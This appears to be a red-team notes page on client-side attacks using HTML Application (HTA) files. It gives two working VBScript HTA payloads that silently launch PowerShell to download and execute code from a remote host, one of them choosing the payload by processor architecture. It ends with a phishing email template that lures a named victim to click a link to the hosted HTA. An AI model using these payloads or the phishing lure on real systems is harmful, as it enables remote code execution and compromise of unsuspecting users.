---
title: HTML Application (HTA)
category: Client Side Attacks
order: 3
---

An HTML Application (HTA) is a proprietary Windows program whose source code consists of HTML and one or more scripting languages supported by Internet Explorer (`VBScript` and `JScript`). The HTML is used to generate the user interface and the scripting language for the program logic. An HTA executes without the constraints of the browser's security model, so it executes as a "fully trusted" application.

An HTA file is executed using `mshta.exe`, which is typically installed along with Internet Explorer.

> **Note**: `mshta` is dependant on Internet Explorer, so if it has been uninstalled, HTAs will be unable to execute.

HTA files has the `.hta` extension.

# Executing x64 powershell payload

```html
<html>
  <head>
    <title>Hello World</title>
  </head>
  <body>
    <h2>Hello World</h2>
    <p>This is an HTA...</p>
  </body>

  <script language="VBScript">
    Function Magic()
      Set shell = CreateObject("wscript.Shell")
      shell.run "C:\Windows\sysnative\WindowsPowerShell\v1.0\powershell.exe -nop -w hidden -c ""IEX ((new-object net.webclient).downloadstring('http://10.10.10.10/a'))"""
    End Function

    Magic
  </script>

</html>
```

# Checking the architecture and executing powershell payload

```html
<html>
  <head>
    <title>Hello World</title>
  </head>
  <body>
    <h2>Hello World</h2>
    <p>This is an HTA...</p>
  </body>

  <script language="VBScript">
	Function Magic()
	  Set shell = CreateObject("wscript.Shell")

	  If shell.ExpandEnvironmentStrings("%PROCESSOR_ARCHITECTURE%") = "AMD64" Then
	    shell.run "powershell.exe -nop -w hidden -c ""IEX ((new-object net.webclient).downloadstring('http://10.10.10.10/a'))"""
	  Else
	    shell.run "powershell.exe -nop -w hidden -c ""IEX ((new-object net.webclient).downloadstring('http://10.10.10.10/b'))"""
	  End If

	End Function

    Magic
  </script>

</html>
```

# Phishing

By default, Outlook has filetype filtering in order to prevent you from attaching certain files to emails.

![](/hackingnotes/images/hta-email.png)

Instead of attaching, we can just host the file on a server and send a link to the victim.

```html
<html>
<body>
	<p>Hi Miguel,</p>
	<p>Please fill this <a href="/staff">form</a> as soon as possible.</p>
	<p>Best regards,</p>
	
</body></html>
```
![](/hackingnotes/images/hta-link.png)